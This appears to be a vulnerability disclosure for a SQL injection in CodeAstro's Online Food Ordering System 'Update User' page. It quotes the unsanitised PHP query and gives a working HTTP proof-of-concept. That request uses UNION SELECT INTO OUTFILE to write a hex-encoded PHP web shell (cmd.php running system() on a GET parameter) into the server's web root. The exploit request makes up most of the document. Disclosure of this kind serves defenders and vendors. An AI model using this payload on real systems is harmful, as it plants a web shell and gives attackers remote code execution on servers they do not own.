# Remote Code Execution via SQL Injection in Online Food Ordering System


## Vendor and Product information:
* **Vendor:** CodeAstro
* **Product:** Online Food Ordering System
* **Product URL:** https://codeastro.com/online-food-ordering-system-in-php-mysql-with-source-code/

## Description
An SQL injection vulnerability in the "Update User" page can be chained to execute arbitrary code remotely on the server. This could allow attackers to access sensitive data, disrupt services, and compromise the overall availability of the system.
## Code
~~~ php
<?php $ssql ="select * from users where u_id='$_GET[user_upd]'";
 $res=mysqli_query($db, $ssql); 
 $newrow=mysqli_fetch_array($res);?>
~~~

## Proof of Concept
**HTTP Request Example**
``` http request
GET /OnlineFood-PHP/admin/update_users.php?user_upd=-6'+union+select+1,0x3c3f706870206563686f2073797374656d28245f4745545b305d293b3f3e,3,4,5,6,7,8,9,10+INTO+OUTFILE+'/opt/lampp/htdocs/OnlineFood-PHP/cmd.php'--+- HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://localhost/OnlineFood-PHP/admin/all_users.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

## Screenshot
![image](https://github.com/user-attachments/assets/343d6174-3a4e-4182-a661-9e261e008362)



## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
